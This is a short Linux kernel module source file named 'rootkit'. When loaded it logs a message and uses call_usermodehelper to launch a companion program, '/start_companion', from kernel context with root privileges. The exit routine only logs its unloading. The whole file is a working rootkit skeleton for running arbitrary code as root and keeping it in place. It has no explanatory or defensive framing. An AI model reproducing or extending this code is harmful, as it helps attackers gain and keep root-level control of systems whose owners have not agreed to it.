#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

static int rootkit_init(void) {
    printk(KERN_INFO "Rootkit has been loaded\n");
    char *argv[] = {"/start_companion", NULL};
     char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };

    int r = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    printk("%i\n", r);
    return 0;
}

static void rootkit_exit(void) {
    printk(KERN_INFO "Rootkit has been unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
